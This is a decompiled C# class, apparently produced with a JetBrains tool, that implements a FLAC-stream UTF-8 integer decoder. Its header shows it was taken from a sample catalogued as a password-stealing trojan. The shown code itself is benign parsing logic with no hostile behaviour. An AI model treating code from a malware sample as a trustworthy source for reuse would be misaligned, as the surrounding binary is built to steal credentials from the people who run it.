// Decompiled with JetBrains decompiler
// Type: flac.Io.UTF8Decoder
// Assembly: STAThreadAttrib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EE3DE1A-E148-4FBA-A193-65BEA1824C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f6a784c2aa30ddaf03919958455d18bf51533a475c21a73eff578df0174cc5d4.exe

namespace flac.Io
{
  internal static class UTF8Decoder
  {
    public static byte[] ReadUtf8UInt(FlacStreamReader reader, out uint decodedValue)
    {
      byte[] numArray = new byte[6];
      uint num1 = (uint) reader.ReadByte();
      numArray[0] = (byte) num1;
      uint num2;
      uint num3;
      if (((int) num1 & 128) == 0)
      {
        num2 = num1;
        num3 = 0U;
      }
      else if (((int) num1 & 192) != 0 && ((int) num1 & 32) == 0)
      {
        num2 = num1 & 31U;
        num3 = 1U;
      }
      else if (((int) num1 & 224) != 0 && ((int) num1 & 16) == 0)
      {
        num2 = num1 & 15U;
        num3 = 2U;
      }
      else if (((int) num1 & 240) != 0 && ((int) num1 & 8) == 0)
      {
        num2 = num1 & 7U;
        num3 = 3U;
      }
      else if (((int) num1 & 248) != 0 && ((int) num1 & 4) == 0)
      {
        num2 = num1 & 3U;
        num3 = 4U;
      }
      else if (((int) num1 & 252) != 0 && ((int) num1 & 2) == 0)
      {
        num2 = num1 & 1U;
        num3 = 5U;
      }
      else
      {
        decodedValue = uint.MaxValue;
        goto label_18;
      }
      for (; num3 > 0U; --num3)
      {
        uint num4 = (uint) reader.ReadByte();
        numArray[6 - (int) num3] = (byte) num4;
        if (((int) num4 & 128) == 0 || (num4 & 64U) > 0U)
        {
          decodedValue = uint.MaxValue;
          goto label_18;
        }
        else
          num2 = num2 << 6 | num4 & 63U;
      }
      decodedValue = num2;
label_18:
      return numArray;
    }

    public static byte[] ReadUtf8ULong(FlacStreamReader reader, out ulong decodedValue)
    {
      byte[] numArray = new byte[7];
      uint num1 = (uint) reader.ReadByte();
      numArray[0] = (byte) num1;
      ulong num2;
      uint num3;
      if (((int) num1 & 128) == 0)
      {
        num2 = (ulong) num1;
        num3 = 0U;
      }
      else if (((int) num1 & 192) != 0 && ((int) num1 & 32) == 0)
      {
        num2 = (ulong) (num1 & 31U);
        num3 = 1U;
      }
      else if (((int) num1 & 224) != 0 && ((int) num1 & 16) == 0)
      {
        num2 = (ulong) (num1 & 15U);
        num3 = 2U;
      }
      else if (((int) num1 & 240) != 0 && ((int) num1 & 8) == 0)
      {
        num2 = (ulong) (num1 & 7U);
        num3 = 3U;
      }
      else if (((int) num1 & 248) != 0 && ((int) num1 & 4) == 0)
      {
        num2 = (ulong) (num1 & 3U);
        num3 = 4U;
      }
      else if (((int) num1 & 252) != 0 && ((int) num1 & 2) == 0)
      {
        num2 = (ulong) (num1 & 1U);
        num3 = 5U;
      }
      else if (((int) num1 & 254) != 0 && ((int) num1 & 1) == 0)
      {
        num2 = 0UL;
        num3 = 6U;
      }
      else
      {
        decodedValue = ulong.MaxValue;
        goto label_20;
      }
      for (; num3 > 0U; --num3)
      {
        uint num4 = (uint) reader.ReadByte();
        numArray[7 - (int) num3] = (byte) num4;
        if (((int) num4 & 128) == 0 || (num4 & 64U) > 0U)
        {
          decodedValue = ulong.MaxValue;
          goto label_20;
        }
        else
          num2 = num2 << 6 | (ulong) (num4 & 63U);
      }
      decodedValue = num2;
label_20:
      return numArray;
    }
  }
}
